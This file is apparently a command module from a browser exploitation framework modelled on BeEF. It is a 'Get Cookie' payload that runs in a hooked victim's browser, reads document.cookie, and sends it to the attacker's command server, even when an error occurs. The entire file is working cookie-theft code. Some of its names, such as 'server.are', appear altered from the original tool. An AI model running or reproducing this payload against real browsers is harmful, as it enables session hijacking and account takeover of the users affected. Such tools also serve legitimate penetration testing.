//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//
server.execute(function() {
try {
      server.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, server.are.status_success());
      server.debug("[Get Cookie] Cookie captured: "+document.cookie);
}catch(e){
      server.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, server.are.status_error());
      server.debug("[Get Cookie] Error");
}
});

